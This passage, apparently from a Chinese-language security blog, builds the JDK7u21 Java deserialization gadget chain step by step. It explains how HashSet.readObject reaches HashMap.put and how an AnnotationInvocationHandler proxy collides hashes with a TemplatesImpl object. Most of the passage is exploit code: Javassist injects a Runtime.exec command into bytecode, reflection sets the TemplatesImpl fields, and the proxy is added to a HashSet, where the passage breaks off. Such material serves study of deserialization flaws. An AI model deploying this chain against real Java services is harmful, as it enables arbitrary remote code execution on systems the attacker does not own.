</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">HashMap</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">Object</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">Object</span><span style="color:#56b6c2">&gt;</span> <span style="color:#e06c75">hashMap</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">HashMap</span><span style="color:#56b6c2">&lt;&gt;();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">hashMap</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">put</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">templatesImpl</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#7f848e">//让hash(proxy) == hash(templatesImpl)
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>        <span style="color:#e06c75">InvocationHandler</span> <span style="color:#e06c75">annotationHandlerInvocationHandler</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">InvocationHandler</span><span style="color:#56b6c2">)</span> <span style="color:#e06c75">annotationHandlerInvocationHandlerConstructor</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">newInstance</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">Templates</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">hashMap</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Templates</span> <span style="color:#e06c75">proxy</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">Templates</span><span style="color:#56b6c2">)</span> <span style="color:#e06c75">Proxy</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">newProxyInstance</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">ClassLoader</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getSystemClassLoader</span><span style="color:#56b6c2">(),</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">Class</span><span style="color:#56b6c2">[]{</span><span style="color:#e06c75">Templates</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">},</span> <span style="color:#e06c75">annotationHandlerInvocationHandler</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span><span style="color:#7f848e">//        proxy.equals(templatesImpl);
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">HashMap</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">Object</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">Object</span><span style="color:#56b6c2">&gt;</span> <span style="color:#e06c75">hashMap1</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">HashMap</span><span style="color:#56b6c2">&lt;&gt;();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">hashMap1</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">put</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">templatesImpl</span><span style="color:#56b6c2">,</span><span style="color:#98c379">&#34;1&#34;</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">hashMap1</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">put</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">proxy</span><span style="color:#56b6c2">,</span> <span style="color:#98c379">&#34;1&#34;</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span><span style="color:#56b6c2">}</span>
</span></span></code></pre></div><h4 id="构造第三部分poc">构造第三部分POC</h4>
<p>接着寻找一下哪个方法会调用<code>HashMap.put</code>方法，看到<code>HashSet</code>类</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#c678dd">private</span> <span style="color:#e5c07b">void</span> <span style="color:#61afef;font-weight:bold">readObject</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">java</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">io</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">ObjectInputStream</span> <span style="color:#e06c75">s</span><span style="color:#56b6c2">)</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">throws</span> <span style="color:#e06c75">java</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">io</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">IOException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">ClassNotFoundException</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#7f848e">// Read in any hidden serialization magic
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>        <span style="color:#e06c75">s</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">defaultReadObject</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#7f848e">// Read in HashMap capacity and load factor and create backing HashMap
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>        <span style="color:#e5c07b">int</span> <span style="color:#e06c75">capacity</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">s</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">readInt</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">float</span> <span style="color:#e06c75">loadFactor</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">s</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">readFloat</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">map</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">(((</span><span style="color:#e06c75">HashSet</span><span style="color:#56b6c2">)</span><span style="color:#c678dd">this</span><span style="color:#56b6c2">)</span> <span style="color:#c678dd">instanceof</span> <span style="color:#e06c75">LinkedHashSet</span> <span style="color:#56b6c2">?</span>
</span></span><span style="display:flex;"><span>               <span style="color:#c678dd">new</span> <span style="color:#e06c75">LinkedHashMap</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">E</span><span style="color:#56b6c2">,</span><span style="color:#e06c75">Object</span><span style="color:#56b6c2">&gt;(</span><span style="color:#e06c75">capacity</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">loadFactor</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">:</span>
</span></span><span style="display:flex;"><span>               <span style="color:#c678dd">new</span> <span style="color:#e06c75">HashMap</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">E</span><span style="color:#56b6c2">,</span><span style="color:#e06c75">Object</span><span style="color:#56b6c2">&gt;(</span><span style="color:#e06c75">capacity</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">loadFactor</span><span style="color:#56b6c2">));</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#7f848e">// Read in size
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>        <span style="color:#e5c07b">int</span> <span style="color:#e06c75">size</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">s</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">readInt</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#7f848e">// Read in all elements in the proper order.
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>        <span style="color:#c678dd">for</span> <span style="color:#56b6c2">(</span><span style="color:#e5c07b">int</span> <span style="color:#e06c75">i</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">0</span><span style="color:#56b6c2">;</span> <span style="color:#e06c75">i</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">size</span><span style="color:#56b6c2">;</span> <span style="color:#e06c75">i</span><span style="color:#56b6c2">++)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">E</span> <span style="color:#e06c75">e</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">E</span><span style="color:#56b6c2">)</span> <span style="color:#e06c75">s</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">readObject</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">map</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">put</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">e</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">PRESENT</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span></code></pre></div><p>这里<code>readObject()</code>就调用了<code>HashMap.put</code>方法，让我们研究一下怎么接上面的<code>Gadget</code></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>        <span style="color:#e06c75">map</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">(((</span><span style="color:#e06c75">HashSet</span><span style="color:#56b6c2">)</span><span style="color:#c678dd">this</span><span style="color:#56b6c2">)</span> <span style="color:#c678dd">instanceof</span> <span style="color:#e06c75">LinkedHashSet</span> <span style="color:#56b6c2">?</span>
</span></span><span style="display:flex;"><span>               <span style="color:#c678dd">new</span> <span style="color:#e06c75">LinkedHashMap</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">E</span><span style="color:#56b6c2">,</span><span style="color:#e06c75">Object</span><span style="color:#56b6c2">&gt;(</span><span style="color:#e06c75">capacity</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">loadFactor</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">:</span>
</span></span><span style="display:flex;"><span>               <span style="color:#c678dd">new</span> <span style="color:#e06c75">HashMap</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">E</span><span style="color:#56b6c2">,</span><span style="color:#e06c75">Object</span><span style="color:#56b6c2">&gt;(</span><span style="color:#e06c75">capacity</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">loadFactor</span><span style="color:#56b6c2">));</span>
</span></span></code></pre></div><p>要想调用<code>HashMap.put</code>方法，<code>HashSet</code>不为<code>LinkedHashSet</code>即可</p>
<p>接着看到下面</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>        <span style="color:#c678dd">for</span> <span style="color:#56b6c2">(</span><span style="color:#e5c07b">int</span> <span style="color:#e06c75">i</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">0</span><span style="color:#56b6c2">;</span> <span style="color:#e06c75">i</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">size</span><span style="color:#56b6c2">;</span> <span style="color:#e06c75">i</span><span style="color:#56b6c2">++)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">E</span> <span style="color:#e06c75">e</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">E</span><span style="color:#56b6c2">)</span> <span style="color:#e06c75">s</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">readObject</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">map</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">put</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">e</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">PRESENT</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span>
</span></span></code></pre></div><p>我们还需要向<code>HashSet</code>分别写入<code>e</code>，从而在反序列化时读取<code>e</code>，然后调用<code>hashMap.put(e. PERSENT)</code></p>
<p>看一下<code>HashSet.writeObject</code></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#c678dd">private</span> <span style="color:#e5c07b">void</span> <span style="color:#61afef;font-weight:bold">writeObject</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">java</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">io</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">ObjectOutputStream</span> <span style="color:#e06c75">s</span><span style="color:#56b6c2">)</span> <span style="color:#c678dd">throws</span> <span style="color:#e06c75">java</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">io</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">IOException</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#7f848e">// Write out any hidden serialization magic
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>    <span style="color:#e06c75">s</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">defaultWriteObject</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#7f848e">// Write out HashMap capacity and load factor
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>    <span style="color:#e06c75">s</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">writeInt</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">map</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">capacity</span><span style="color:#56b6c2">());</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">s</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">writeFloat</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">map</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">loadFactor</span><span style="color:#56b6c2">());</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#7f848e">// Write out size
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>    <span style="color:#e06c75">s</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">writeInt</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">map</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">size</span><span style="color:#56b6c2">());</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#7f848e">// Write out all elements in the proper order.
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>    <span style="color:#c678dd">for</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">E</span> <span style="color:#e06c75">e</span> <span style="color:#56b6c2">:</span> <span style="color:#e06c75">map</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">keySet</span><span style="color:#56b6c2">())</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">s</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">writeObject</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">e</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span><span style="color:#56b6c2">}</span>
</span></span></code></pre></div><p>这里其实是遍历了<code>hashMap</code>的键值集合，然后写入到输入流s中，因此用<code>HashSet.add</code>方法控制<code>e</code></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#c678dd">public</span> <span style="color:#e5c07b">boolean</span> <span style="color:#61afef;font-weight:bold">add</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">E</span> <span style="color:#e06c75">e</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">return</span> <span style="color:#e06c75">map</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">put</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">e</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">PRESENT</span><span style="color:#56b6c2">)==</span><span style="color:#e5c07b">null</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span></code></pre></div><p>梳理完毕之后我们开始构造完整的POC</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#c678dd">public</span> <span style="color:#c678dd">class</span> <span style="color:#e5c07b">jdk7u21Chain</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">public</span> <span style="color:#c678dd">static</span> <span style="color:#c678dd">class</span> <span style="color:#e5c07b">test</span><span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">public</span> <span style="color:#c678dd">static</span> <span style="color:#e5c07b">void</span> <span style="color:#61afef;font-weight:bold">main</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">String</span><span style="color:#56b6c2">[]</span> <span style="color:#e06c75">args</span><span style="color:#56b6c2">)</span> <span style="color:#c678dd">throws</span> <span style="color:#e06c75">NoSuchFieldException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">IOException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">IllegalAccessException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">NotFoundException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">CannotCompileException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">ClassNotFoundException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">NoSuchMethodException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">InvocationTargetException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">InstantiationException</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">ClassPool</span> <span style="color:#e06c75">pool</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">ClassPool</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getDefault</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">CtClass</span> <span style="color:#e06c75">cc</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pool</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">get</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">test</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getName</span><span style="color:#56b6c2">());</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">String</span> <span style="color:#e06c75">cmd</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;java.lang.Runtime.getRuntime().exec(\&#34;calc\&#34;);&#34;</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">cc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">makeClassInitializer</span><span style="color:#56b6c2">().</span><span style="color:#e06c75">insertBefore</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">cmd</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">cc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">setSuperclass</span><span style="color:#56b6c2">((</span><span style="color:#e06c75">pool</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">get</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">AbstractTranslet</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getName</span><span style="color:#56b6c2">())));</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">TemplatesImpl</span> <span style="color:#e06c75">templatesImpl</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">TemplatesImpl</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Class</span> <span style="color:#e06c75">tc</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">templatesImpl</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getClass</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Field</span> <span style="color:#e06c75">nameField</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">tc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getDeclaredField</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;_name&#34;</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">nameField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">setAccessible</span><span style="color:#56b6c2">(</span><span style="color:#e5c07b">true</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">nameField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">set</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">templatesImpl</span><span style="color:#56b6c2">,</span><span style="color:#98c379">&#34;a&#34;</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#7f848e">//由于getTransletInstance中_name=null会retrun null，所以利用反射，将_name赋值
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Field</span> <span style="color:#e06c75">bytecodesField</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">tc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getDeclaredField</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;_bytecodes&#34;</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">bytecodesField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">setAccessible</span><span style="color:#56b6c2">(</span><span style="color:#e5c07b">true</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">byte</span><span style="color:#56b6c2">[]</span> <span style="color:#e06c75">codes</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">cc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">toBytecode</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">byte</span><span style="color:#56b6c2">[][]</span> <span style="color:#e06c75">bytes</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e5c07b">byte</span><span style="color:#56b6c2">[][]{</span><span style="color:#e06c75">codes</span><span style="color:#56b6c2">};</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">bytecodesField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">set</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">templatesImpl</span><span style="color:#56b6c2">,</span><span style="color:#e06c75">bytes</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#7f848e">//同理defineTransletClasses中_bytecodes == null会抛出异常，所以将其赋值
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Field</span> <span style="color:#e06c75">tfactoryField</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">tc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getDeclaredField</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;_tfactory&#34;</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">tfactoryField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">setAccessible</span><span style="color:#56b6c2">(</span><span style="color:#e5c07b">true</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">tfactoryField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">set</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">templatesImpl</span><span style="color:#56b6c2">,</span><span style="color:#c678dd">new</span> <span style="color:#e06c75">TransformerFactoryImpl</span><span style="color:#56b6c2">());</span>
</span></span><span style="display:flex;"><span>        <span style="color:#7f848e">//本意是为了在defineTransletClasses中，避免_tfactory值为null，导致_tfactory.getExternalExtensionsMap()错误
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>        <span style="color:#7f848e">//但实际上并不影响代码执行
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>        
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Class</span><span style="color:#56b6c2">&lt;?&gt;</span> <span style="color:#e06c75">aClass</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">forName</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Constructor</span><span style="color:#56b6c2">&lt;?&gt;</span> <span style="color:#e06c75">annotationHandlerInvocationHandlerConstructor</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">aClass</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getDeclaredConstructor</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">Class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">Map</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">annotationHandlerInvocationHandlerConstructor</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">setAccessible</span><span style="color:#56b6c2">(</span><span style="color:#e5c07b">true</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">HashMap</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">Object</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">Object</span><span style="color:#56b6c2">&gt;</span> <span style="color:#e06c75">hashMap</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">HashMap</span><span style="color:#56b6c2">&lt;&gt;();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">hashMap</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">put</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">templatesImpl</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#7f848e">//让hash(proxy) == hash(templatesImpl)
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>        <span style="color:#e06c75">InvocationHandler</span> <span style="color:#e06c75">annotationHandlerInvocationHandler</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">InvocationHandler</span><span style="color:#56b6c2">)</span> <span style="color:#e06c75">annotationHandlerInvocationHandlerConstructor</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">newInstance</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">Templates</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">hashMap</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Templates</span> <span style="color:#e06c75">proxy</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">Templates</span><span style="color:#56b6c2">)</span> <span style="color:#e06c75">Proxy</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">newProxyInstance</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">ClassLoader</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getSystemClassLoader</span><span style="color:#56b6c2">(),</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">Class</span><span style="color:#56b6c2">[]{</span><span style="color:#e06c75">Templates</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">},</span> <span style="color:#e06c75">annotationHandlerInvocationHandler</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span><span style="color:#7f848e">//        proxy.equals(templatesImpl);
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>
</span></span><span style="display:flex;"><span><span style="color:#7f848e">//        HashMap&lt;Object, Object&gt; hashMap1 = new HashMap&lt;&gt;();
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e">//        hashMap1.put(templatesImpl,&#34;1&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e">//        hashMap1.put(proxy, &#34;1&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">HashSet</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">Object</span><span style="color:#56b6c2">&gt;</span> <span style="color:#e06c75">hashSet</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">HashSet</span><span style="color:#56b6c2">&lt;&gt;();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">hashSet</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">add</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">proxy</span><span style="color:#56b6c2">);</span>
